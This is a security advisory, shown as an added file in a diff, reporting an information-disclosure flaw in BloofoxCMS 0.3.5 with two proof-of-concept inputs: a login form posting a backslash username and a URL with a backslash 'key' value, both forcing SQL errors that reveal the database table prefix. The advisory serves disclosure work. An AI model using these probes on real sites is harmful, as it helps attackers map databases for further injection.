@@ -1,0 +1,32 @@
+Vulnerability ID: HTB22660
+Reference: http://www.htbridge.ch/advisory/information_disclosure_in_bloofoxcms_1.html
+Product: BloofoxCMS
+Vendor: bloofox.com ( http://bloofox.com/ ) 
+Vulnerable Version: 0.3.5 and probably prior versions 
+Vendor Notification: 13 October 2010 
+Vulnerability Type: Information Disclosure
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in username variable, it's possible to generate an sql query error that will reveal the database tables prefix.
+
+The following PoC is available:
+
+
+<form action="http://[host]/index.php?login=true" method="post">
+<input name="username" type="hidden" value="\\">
+<input name="password" type="hidden" value="password">
+<input value="Login" name="login" type="submit">
+</form> 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in key variable, it's possible to generate an sql query error that will reveal the database tables prefix.
+
+The following PoC is available:
+
+
+http://[host]/index.php?key=\\
+
+
